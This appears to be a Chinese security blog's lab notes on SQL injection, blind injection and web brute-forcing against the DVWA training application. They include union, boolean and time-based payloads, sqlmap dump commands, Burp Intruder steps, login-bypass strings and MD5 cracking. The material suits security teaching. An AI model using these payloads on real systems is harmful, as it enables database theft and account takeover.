        <content type="html"><![CDATA[</p><h1 id="SQL注入攻击实战"><a href="#SQL注入攻击实战" class="headerlink" title="SQL注入攻击实战"></a>SQL注入攻击实战</h1><h2 id="SQL注入概述"><a href="#SQL注入概述" class="headerlink" title="SQL注入概述"></a>SQL注入概述</h2><p>　　<font face="隶书">所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。它是利用现有应用程序，将（恶意的）SQL 命令注入到后台数据库引擎执行的能力，它可以通过在 Web 表单中输入（恶意）SQL 语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行 SQL 语句。</font></p><p>　<font face="隶书">　SQL 注入一般按照注入方式可以分为普通注入和盲注。普通注入就是注入的页面是直接显示数据库中的字段内容的，我们可以通过 SQL 注入一步一步把数据库中我们想要的内容显示在页面中。而盲注则要困难很多，页面并没有直接显示数据库字段内容，显示的可能只是一个判断结果（是或者否），页面只能告诉你你构造的 SQL 语句对还是错，你要查询的内容存在还是不存在。这种情况下，我们只能全部靠猜。更有甚者，连是否的结果都不显示，我们可能还需要通过返回数据的延迟来判断是否猜对。</font></p><p>　<font face="隶书">　SQL 注入按照注入的数据类型还可以分为数字型注入和字符型注入。SQL 注入一般都需要利用 Web 站点现有的查询语句。当现有的查询语句 Where 筛选条件匹配的字段是数值类型，那么就是数字型注入；如果匹配的字段是字符类型，那么就是字符型注入。一般字符型注入需要构造单引号用于闭合语法，还需要加入注释符使原本的单引号无效。另外，SQL 注入按照提交参数方式，还可以分为 GET 方式注入、POST 方式注入等等。</font></p><h2 id="Low级别SQL注入实战"><a href="#Low级别SQL注入实战" class="headerlink" title="Low级别SQL注入实战"></a>Low级别SQL注入实战</h2><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">常用函数：</span><br><span class="line">group_concat(str) 将获取到的内容合并成一行输出</span><br><span class="line">concat_ws(str1,str2…) 合并输出查询的字段</span><br><span class="line">table_name 具体的数据表</span><br><span class="line">column_name 字段名</span><br><span class="line">information_schema 自5.7及后的MySQL版本，都有了这个库，所有的表都会记录在这个数据库下</span><br><span class="line">information_schema.tables 所有的数据表</span><br><span class="line">information_schema.columns 所有的数据表中的字段</span><br><span class="line">table_schema 数据库的名称</span><br><span class="line">where 筛选指定内容</span><br><span class="line">order by 判断有多少字段</span><br><span class="line">database() 查看当前使用什么数据库</span><br><span class="line">version() 查看当前使用什么版本的MySQL</span><br><span class="line">@@datadir 查看当前MySQL的路径</span><br><span class="line">@@version_compile_os 查看操作系统版本</span><br><span class="line">limit 查询其它数据库或者表,列等名称</span><br><span class="line">user() 查询当前用户权限</span><br></pre></td></tr></table></figure><hr><h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><p><strong>I</strong>.<em>设置安全级别为Low后，点击</em><code>SQL Injection</code><em>进入SQL注入练习页面。首先在文本框随便输入一个ID号，发现可以返回用户信息。同时发现URL中出现了提交的参数信息，说明该页面提交方式为</em><code>GET</code>，<em>如</em><code>图1-1</code></p><p><font face="隶书">GET从服务器上获取数据;POST是向服务器传送数据</font><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/01.jpg"><em>图1-1</em></p><p><strong>II</strong>.<em>在文本框输入</em><code>单引号</code>，<em>发现错误，判断存在SQL漏洞，并从报错信息中得知该站点的数据库为 MySQL</em>如<code>图1-2</code><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/02.jpg" alt="image-20221031220308148"><em>图1-2</em></p><p><strong>III</strong>.<em>在文本框输入</em><code>1 and 1=1</code><em>和</em><code>1 and 1=2</code>，<em>都能返回数据，说明可能注入漏洞是字符型，如</em><code>图1-3</code></p><p><font face="隶书">数字型和字符型区别在于是否闭合，<strong>字符型注入需要闭合</strong>，<strong>数字型注入不需要闭合</strong></font><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/03.jpg"><em>图1-3</em></p><p><strong>IV</strong>.<em>寻找注入点，在文本框输入</em><code>1&#39; and 1=1#</code>，<em>可以返回数据</em>，<em>输入</em><code>1&#39; and 1=2#</code>，<em>没有数据返回，说明漏洞为字符型，如</em><code>图1-4</code>。<img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/04.jpg"><em>图1-4</em></p><p><strong>V</strong>.<em>在文本框输入</em> <code>1&#39; order by 1#</code> <em>和</em> <code>1&#39; order by 2#</code>，<em>有数据返回，输入</em> <code>1&#39; order by 3#</code>，<em>页面报错，<strong>判断字段为2个字段</strong></em>，如<code>图1-5</code><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/05.jpg"><em>图1-5</em></p><p><strong>VI</strong>.<em>找回显点，在文本框输入</em><code>1&#39; and 1=2 union select 1,2#</code>，<em>确认页面中First name处显示的是记录集中第一个字段，Surname处显示的是记录集中第二字段</em>，如<code>图1-6</code><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/06.jpg"><em>图1-6</em></p><p><strong>VII</strong>.<em>在文本框输入</em><code>1&#39; and 1=2 union select database(),2#</code>，<em>原第一个字段处显示当前数据库名称为</em><code>dvwa</code>，如<code>图1-7</code><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/07.jpg"><em>图1-7</em></p><p><strong>VIII</strong>.<em>在文本框输入</em> <code>1&#39; and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</code>，<em>原第二个字段处显示当前数据库中的所有表名。发现 guestbook 表和 users 表，users 表中极有可能是记录用户名和密码的表，如</em><code>图1-8</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注：group_concat 把查询数据放到一列中显示；where 筛选指定内容</span><br></pre></td></tr></table></figure><p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/08.jpg"><em>图1-8</em></p><p><strong>IX</strong>.<em>在文本框输入</em> <code>1&#39; and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;#</code>，<em>原第二个字段处显示 users 表中的所有字段名。其中发现 user 和 password 字段，极有可能是用户名和密码字段，如</em><code>图1-9</code><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/1-9.jpg"><em>图1-9</em></p><p><strong>X</strong>.<em>在文本框输入</em><code>1&#39; and 1=2 union select user,password from users#</code>，原第一个字段和第二个字段处分别显示表中的用户名和密码，如<code>图1-10</code><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/10.jpg"><em>图1-10</em></p><p><strong>XI</strong>.<em>在<code>http://www.cmd5.com/</code>线破解MD5加密密码，即可得到密码明文，如</em><code>图1-11</code><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/11.jpg"><em>图1-11</em></p><h3 id="SQLMap-自动化注入"><a href="#SQLMap-自动化注入" class="headerlink" title="SQLMap 自动化注入"></a>SQLMap 自动化注入</h3><p><strong>I</strong>. <em>在kali中访问DVWA，安全级别设置为<code>Low</code>，进入SQL注入模块，随意输入ID值，并复制当前URL地址</em></p><p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/12.jpg"></p><p><strong>II</strong>.<em>使用SQLMAP对dvwa中的sql injection模块进行注入</em>，<em>获取靶机mysql中有哪些数据库</em>。</p><p><code>┌──(kali㉿kali)-[~]</code><br><code>└─$ sqlmap -u &quot;http://192.168.23.110/DVWA/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=2sr6365av3asq6o21suh8h8sj5&quot; -batch --dbs</code></p><p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/13.jpg"></p><p><strong>II</strong>. <em>获取dvwa数据库有哪些表</em></p><p><code>┌──(kali㉿kali)-[~]</code><br><code>└─$ sqlmap -u &quot;http://192.168.23.110/DVWA/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=2sr6365av3asq6o21suh8h8sj5&quot; –batch -D dvwa –tables</code></p><p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/14.jpg"></p><p><strong>III</strong>.  <em>获取dvwa数据库users表中有哪些字段</em></p><p><code>┌──(kali㉿kali)-[~]</code><br><code>└─$ sqlmap -u &quot;http://192.168.23.110/DVWA/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=2sr6365av3asq6o21suh8h8sj5&quot; –batch -D dvwa –T users  --columns</code></p><p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/15.jpg"></p><p><strong>IV</strong>.  <em>查询users表中user和password两个字段的数据。</em></p><p><code>┌──(kali㉿kali)-[~]</code><br><code>└─$ sqlmap -u &quot;http://192.168.23.110/DVWA/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=2sr6365av3asq6o21suh8h8sj5&quot; –batch -D dvwa –T users  --C &quot;user,password&quot; --dump</code></p><p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/16.jpg"></p><h1 id="SQL-盲注攻击实战"><a href="#SQL-盲注攻击实战" class="headerlink" title="SQL 盲注攻击实战"></a>SQL 盲注攻击实战</h1><h2 id="SQL盲注的分类"><a href="#SQL盲注的分类" class="headerlink" title="SQL盲注的分类"></a>SQL盲注的分类</h2><p>​<font face="黑体">SQL 注入可以分为普通注入和盲注。当注入的页面无法直接显示数据内容，就只能靠盲注来猜解。盲注又可以具体分为布尔型盲注和延时型盲注。</font></p><p>​<font face="黑体">布尔型盲注是指注入页面中没有直接显示数据内容，但会显示输出的结果对还是错，查询的数据有还是没有。比如输入的 ID 值查询到有该记录，就在页面上显示该记录存在；如果输入的 ID 值不存在，页面上就显示记录不存在，除此之外没有任何更多的信息，我们通过注入构造的任何 SQL 语句也只能返回存在或者不存在两种结果。通过返回结果的对或错来判断构造的 SQL 语句是否成立，这种盲注方式就是布尔型盲注。 </font></p><p>​<font face="黑体">对于某些 SQL 注入页面，可能页面中任何信息都不返回，甚至连记录是否存在都不告诉你，这时布尔型盲注也就无效了。但是基于 <code>sleep()</code> 函数可以实现延时查询，我们可以构造一个判断语法，如果返回结果为真，则延时 5 秒再进行查询操作。那么我们就可以通过观察提交 SQL 注入语句后，页面响应是否有延时卡顿，来判断我们构造的 SQL 语句是否成立。这种盲注方式就称为延时型盲注。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">常用函数：</span><br><span class="line">length(&#x27;abcd&#x27;)//获取长度函数</span><br><span class="line">截取字符串：</span><br><span class="line">select mid(&#x27;abcdefghijklm&#x27;,5,5);</span><br><span class="line">select substr(&#x27;abcdefghijklm&#x27;,5,5);</span><br><span class="line">select left(&#x27;abcdefhijklm&#x27;,5);</span><br><span class="line">转换成ascii码：</span><br><span class="line">select ord(&#x27;a&#x27;);</span><br><span class="line">select ascii(&#x27;a&#x27;);</span><br></pre></td></tr></table></figure><h2 id="Low-级别-SQL-盲注攻击实战"><a href="#Low-级别-SQL-盲注攻击实战" class="headerlink" title="Low 级别 SQL 盲注攻击实战"></a>Low 级别 SQL 盲注攻击实战</h2><h3 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h3><p><strong>One</strong>.<em>设置安全级别为 <code>Low</code>，点击 <code>SQL Injection (Blind)</code> 按钮进入 SQL 盲注攻击模块，随便输入 ID 值，发现只返回一个结果 <code>User ID exists in the database</code>，告诉我们该 ID 存在，没有显示关于该 User 的任何信息。说明该页面只能通过盲注来攻击</em>。<img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/50.jpg"></p><p><strong>Two</strong>.<em>文本框中输入</em> <code>1 and 1=1</code> 和 <code>1 and 1=2</code> 都返回结果 <code>exists</code>，<em>说明不是数字型注入点</em>。<img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/51.jpg"></p><p><strong>Three</strong>.<em>在文本框中输入</em> <code>1&#39; and 1=1#</code>，<em>返回结果</em> <code>exists</code>，输入 <code>1&#39; and 1=2#</code>，返回结果 <code>MISSING</code>，<em>说明存在 SQL 注入漏洞，为字符型</em>。<img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/52.jpg"></p><p><strong>Four</strong>.<em>在文本框中输入 <code>1&#39; and length(database())=1#</code>，返回结果 <code>MISSING</code>，说明当前数据库名长度大于 1 个字符</em>。</p><p><font face="隶书">注：length(database()) &#x2F;&#x2F;当前数据库名的长度</font><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/53.jpg"></p><p><strong>Five</strong>.<em>逐个猜测数据库名字长度，直到输入 <code>1&#39; and length(database())=4#</code> 时，返回结果 <code>exists</code>，说明当前数据库名长度为 4 字符</em>。</p><p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/54.jpg"></p><p><strong>Six</strong>.<em>在文本框中输入 <code>1&#39; and ascii(substr(database(),1,1))&gt;97#</code>，返回结果 <code>exists</code>，输入 <code>1&#39; and acsii(substr(database(),1,1))&lt;122#</code>，返回结果 <code>exists</code>，说明数据库名的第一位字符是小写字母。（小写字母 a 的 ASCII 码为 97，小写字母 z 的 ASCII 码为 122）。</em><font face="黑体">过程略</font></p><p><font face="隶书">注：substr(database(),1,1) &#x2F;&#x2F;截取数据库名称，从第一个字符开始截，一共截取1个字符</font><br><font face="隶书">注：ascii()                      &#x2F;&#x2F;取括号中的字符的 ASCII 码</font></p><p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/55.jpg"></p><p><strong>Seven</strong>.</p><p><strong>方法1</strong>：<em>通过增加数字 97 来逐步缩小范围，直到输入 <code>1&#39; and ascii(substr(database(),1,1))&gt;100#</code>，返回结果 <code>MISSING</code>，说明数据库名的第一个字符的 ASCII 码正好是 100，也就是小写字母 d</em>。</p><p><strong>方法2</strong>：<em>输入</em><code>1&#39; and substr(database(),1,1)=&#39;d&#39;#</code><em>或</em><code>1&#39; and ord(substr(database(),1,1))=100#</code><em>判断当前数据库是第一个字母是不是d</em>。</p><p><font face="黑体">过程略</font></p><p><strong>Eight</strong>.</p><p><strong>方法1</strong>：<em>在文本框中输入 <code>1&#39; and ascii(substr(database(),2,1))&lt;119#</code>，返回结果 <code>exists</code>，输入 <code>1&#39; and ascii(substr(database(),2,1))&lt;118#</code>，返回结果 <code>MISSING</code>，说明第二位字符是小写字母 v</em>。</p><p><strong>方法2</strong>.输入<code>1&#39;and substr(database(),2,1)=&#39;v&#39;#</code>或<code>1&#39;and ord(substr(database(),2,1))=118#</code></p><p><font face="黑体">使用相同的方法，最终可以猜测出数据库名为 <code>dvwa</code></font></p><p><font face="黑体"><font face="黑体">过程略</font></font></p><p><strong>Nine</strong>.<em>在文本框中输入 <code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=1#</code>，返回结果 <code>MISSING</code>，输入 <code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=2#</code>，返回结果 <code>exists</code>，说明当前数据库中存在 2 张表</em>。</p><p><font face="黑体"><font face="黑体">过程略</font></font></p><p><strong>Ten</strong>.<em>在文本框中输入 <code>1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=1#</code>，返回结果 <code>MISSING</code>，逐步增大猜测数字，直到猜测数字 9，返回结果 <code>exists</code>。最后得知数据库中第一张表名长度为 9 字符</em>。<font face="黑体"><font face="黑体">过程略</font></font></p><p><font face="隶书">注：select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1</font><br><font face="隶书">&#x2F;&#x2F;查询当前数据库中的表名，只取第 0 和第 1 条记录之间的记录，也就是查询出的第一张表名</font></p><p><strong>Eleven</strong>.<em>在文本框中输入 <code>1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 1,2))=1#</code>，返回结果 <code>MISSING</code>，逐步增大猜测数字，直到猜测数字 5，返回结果 <code>exists</code>。最后得知数据库中第二张表名长度为 5 字符</em>。<font face="黑体"><font face="黑体">过程略</font></font></p><p><font face="隶书">注：select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,2</font><br><font face="隶书">&#x2F;&#x2F;查询当前数据库中的表名，只取第 1 和第 2 条之间的记录，也就是查询出的第二张表名</font></p><p><strong>Twelve</strong>.<em>在文本框中输入 <code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97#</code>，返回结果 <code>exists</code>，输入 <code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122#</code>，返回结果 <code>exists</code>，说明第一张表名的第一位字符为小写字母</em> (原理同Six)。<font face="黑体">过程略</font></p><p><strong>Thirteen</strong>.</p><p><strong>方法1</strong>：<em>逐步缩小范围，最终可确认第一张表名的第一位字符为字母 g。输入 <code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;97#</code>，猜解第一张表名的第二位字符</em>。</p><p><strong>方法2</strong>：<code>1&#39; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)=&#39;u&#39;#</code>    &#x2F;&#x2F;判断当前数据库的第一个表的第二个字母是不是’u’。</p><p><font face="黑体">过程略</font></p><p><strong>Fourteen</strong>.</p><p><strong>方法1</strong>：<em>输入 <code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,2),1,1))&gt;97#</code>，猜解第二张表名的第一位字符。重复上述步骤最终可猜解出两个表名分别为 <code>guestbook</code> 和 <code>users</code>。</em></p><p><strong>方法2</strong>：<code>1&#39; and substr((select table_name from information_schema.tables where table_schema=database() limit 1,2),1,1)=&#39;u&#39;#</code>    &#x2F;&#x2F;判断当前数据库的第二个表的第一个字母是不是’u’。</p><p><font face="黑体">过程略</font></p><p><strong>Fifteen</strong>.<em>输入 <code>1 and (select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)=1 #</code>，来猜解 <code>users</code> 表中的字段数量，通过不断加大猜解数字来缩小范围，最终确定字段数量</em>。</p><p><font face="黑体">过程略</font></p><p><strong>Sixteen</strong>.<em>输入 <code>1&#39; and length((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1))=1 #</code>，猜解 <code>users</code> 表中第一个字段名的长度</em>。</p><p><font face="黑体">过程略</font></p><p><strong>Seventeen</strong>.<em>输入 <code>1&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1)1,1))&lt;97#</code>，猜解表中第一个字段名的第一位字符内容，原理同上</em>。</p><p><font face="黑体">过程略</font></p><p><strong>Eighteen</strong>.<em>最终猜解出存在 <code>user</code> 和 <code>password</code> 字段，原理同上。</em></p><p><font face="黑体">过程略</font></p><p><strong>Nineteen</strong>.<em>输入 <code>1&#39; and ascii(substr((select user from users limit 0,1),1,1))&lt;97#</code>，来猜解第一个用户的用户名的第一位字符内容。最终可以猜解出所有用户的用户名和密码密文，原理同上。</em></p><p><font face="黑体">过程略</font></p><h3 id="延时型盲注"><a href="#延时型盲注" class="headerlink" title="延时型盲注"></a>延时型盲注</h3><p><strong>one</strong> .<em>在文本框输入 <code>1&#39; and sleep(5)#</code>，页面响应有明显延时，输入 <code>1 and sleep(5)</code>，页面响应迅速，说明该注入点为字符型</em>。</p><p><strong>Two</strong> .<em>在文本框输入 <code>1&#39; and if(length(database())=1,sleep(5),1)#</code>，页面没有延时，说明 <code>length(database())=1</code> 结果为假，当前数据库名长度不为 1；逐步增加猜测数字，直到输入 <code>1&#39; and if(length(database())=4,sleep(5),1)#</code>，页面延时，说明当前数据库名长度为 4</em>。</p><p><strong>Three</strong> .<em>在文本框输入 <code>1&#39; and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)#</code>，页面延时；输入 <code>1&#39; and if(ascii(substr(database(),1,1))&lt;9122,sleep(5),1)#</code>，页面没有延时，说明当前数据库名第一个字符为小写字母，原理同布尔型盲注。逐渐缩小猜解范围，页面有延时说明猜解正确，页面无延时说明猜解错误，最终可猜解出数据库名第一个字符内容为 d</em>。</p><p><em>判断当前数据库长度</em>：<code>1&#39; and not if((select length(database())=4),sleep(5),0)#</code></p><p><strong>Four</strong> .<em>后续步骤思路与布尔型盲注一致，只需要按照语法把要猜解的条件代入，再根据页面响应是否出现延时来判断构造的 SQL 注入语句是否成立，就可以逐步猜解出需要查询的数据库信息</em>。<font face="黑体">过程略</font></p><p><font face="隶书">语法：1’ and if (要猜解的条件,sleep(5),1)#  </font><br><font face="隶书">&#x2F;&#x2F;判断，如果要猜解的条件成立，则返回 sleep(5)，延时 5 秒；不成立则返回数字 1</font></p><br /><br /><p>【转载文章】</p><p>【1】<a href="http://www.dengfm.com/15621247896045.html">邓大佬-|在线文档库</a></p>]]></content>
      
      
      <categories>
          
          <category> 网安笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web爆破攻击实战</title>
      <link href="/posts/11339"/>
      <url>/posts/11339</url>
      
        <content type="html"><![CDATA[<br /><p><img src="/images/%E6%9D%82%E5%9B%BE/%E8%A1%A8%E6%83%85%E5%8C%8503.jpg"></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>　　<font face="黑体">在很多情况下，黑客在找不到其他途径进入 Web 管理后台时，就会采用暴力破解的方式来破解后台管理员的账号和密码。所谓暴力破解，就是使用“穷举法”，对用户名和密码进行逐个猜解，直至猜出来为止。虽然暴力破解显得不是很有技术含量，但确实最有效的一种方式。理论上来说，只要时间足够，终究会把用户名和密码猜解出来。</font></p><p>　　<font face="黑体">为了提高暴力破解的效率，一般在破解时，都会使用字典。所谓字典，就是黑客会把自己认为的有可能是正确的密码，以及曾经碰到过的密码，写到一个文档里去，这个文档就是字典。在进行暴力破解时，会按照字典的顺序来进行猜解，这样会大大提高破解的效率。</font><br>　　<br>　　<font face="黑体">暴力破解可以分别分为破解用户名和破解密码。在对攻击目标一无所知时，往往不仅要猜解出对方的密码，还需要先猜解出对方的用户名，这时破解难度和需要的时间会以大大提升。但如果已经知道了对方的用户名（极有可能是默认的用户名），只破解密码，难度就要小很多。</font><br>　　<br>　　<font face="黑体">对于 Web 暴力破解来说，由于需要构造 HTTP 请求包，所以必须使用专门的工具，最常见的就是著名的 Burpsuite。Burpsuite 也有专门的爆破模块。</font></p><h2 id="Low级别Web爆破攻击实战"><a href="#Low级别Web爆破攻击实战" class="headerlink" title="Low级别Web爆破攻击实战"></a>Low级别Web爆破攻击实战</h2><h3 id="暴力破解账户密码"><a href="#暴力破解账户密码" class="headerlink" title="暴力破解账户密码"></a>暴力破解账户密码</h3><p><strong>I</strong>.<em>设置安全级别为</em><code>Low</code>，<em>点击</em><code>Brute Force</code><em>按钮</em>，<em>进行暴力破解模块，发现是个用户登录的页面，随意输入用户名和密码，发现提示用户名或密码错误；同时发现输入的用户名和密码携带在了URL中，所以确认该页面提交方式为GET。</em></p><p><img src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/01.jpg"></p><p><strong>II</strong>.<em>已知DVWA存在一个默认账户，用户名和密码为</em><code>admin/password</code>，<em>使用该账户登录</em>，<em>发现页面提示 <code>Welcome to the passowrd protected area admin</code>，来说明登录成功。</em></p><p><img src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/02.jpg"></p><p><strong>III</strong>.<em>构建一个字典文件，其中包含正确的密码信息<code>password</code>。</em></p><p><img src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/03.jpg"></p><p><strong>IV</strong>.<em>设置<code>Burpsuite</code>和浏览器代理，随便输入一个用户名密码，用<code>Burpsuite</code>抓包。</em></p><p><strong>01</strong>.<em>设置浏览器代理，如<code>图1-1</code></em></p><p><img src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/04.jpg"><em>图1-1</em></p><p><strong>02</strong>.<em>启动BP，导入证书</em><code>如图2-1、2-2</code></p><p><img src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/05"><em>图2-1</em></p><p><img src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/06"><em>图2-2</em></p><p><strong>03</strong>.<em>随便输入一个用户名密码，用B<code>urpsuite</code>抓包如<code>图3-1</code></em></p><p><img src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/07"><em>图3-1</em></p><p><strong>III</strong>.<em>点击 <code>Action</code> 按钮，选择 <code>Send to Intruder</code>，把数据包信息发送到暴力破解模块</em>。</p><p><img src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/08"></p><p><strong>IV</strong>.<em>点击 <code>Intruder</code> 模块，选择 <code>Positions</code> 标签，可以看到发送过来的数据包信息，</em></p><p><img src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/09"></p><p><strong>V</strong>.<em>点击 <code>Clear §</code> 按钮清除掉所有变量</em></p><p><img src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/10"></p><p><strong>VI</strong>.<em>我们这里为了节省时间，假定已经得知了用户名为 <code>admin</code>，只猜解密码，所以选中之前随意输入的密码，点击 <code>Add §</code>，把密码部分设置为要猜解的变量，</em></p><p><img src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/11"></p><p><strong>VII</strong>.<em>切换到 <code>Payloads</code> 标签，在 <code>Payload Option</code> 处，点击 <code>Load</code> 按钮，选择之前构建的字典文件</em></p><p><img src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/12"></p><p><strong>VIII</strong>.<em>点击 <code>Start Attack</code> 按钮，开始爆破，可以发现，当猜解到 <code>password</code> 时，回包长度与其他都不一致，而且打钩提示该密码是正确的</em></p><p><img src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/13"></p><h3 id="SQL-注入破解账户密码"><a href="#SQL-注入破解账户密码" class="headerlink" title="SQL 注入破解账户密码"></a>SQL 注入破解账户密码</h3><p><strong>I</strong>.<em>尝试使用 SQL 注入的方式登录，用户名输入 <code>admin’#</code> ，密码留空登录，发现可以直接进入，如<code>图 3-1</code>，<code>图 3-2</code></em></p><p><img src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/14"><em>图3-1</em></p><p><img src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/15"><em>图3-2</em></p><blockquote><p>该方式的原理是，猜测后台验证用户名和密码的 SQL 语句为 <code>select * from users where user=&#39;$_GET[&#39;username&#39;]&#39; and password=&#39;$_GET[&#39;password&#39;]&#39;</code>，我们提交 <code>admin&#39;#</code>，首先通过单引号闭合原语法中的单引号，再用 # 注释掉后面的语句，所以 SQL 注入之后的语句就变成了 <code>select * from users where user=&#39;admin&#39;#&#39; and password=&#39;&#39;</code>，由于 # 后面被注释了，不会提交给服务器执行，所以只要 users 表中存在 admin 用户，无论密码是否正确，都可以通过验证。如果连用户名都不知道，还可以通过 <code>admin&#39; or &#39;1&#39;=&#39;1</code> 来构造一个恒真表达式进行绕过。</p></blockquote><h3 id="Medium-级别-Web-爆破攻击实战"><a href="#Medium-级别-Web-爆破攻击实战" class="headerlink" title="Medium 级别 Web 爆破攻击实战"></a>Medium 级别 Web 爆破攻击实战</h3><p><strong>I</strong>.<em>安全级别设置为 <code>Medium</code>，进入 Web 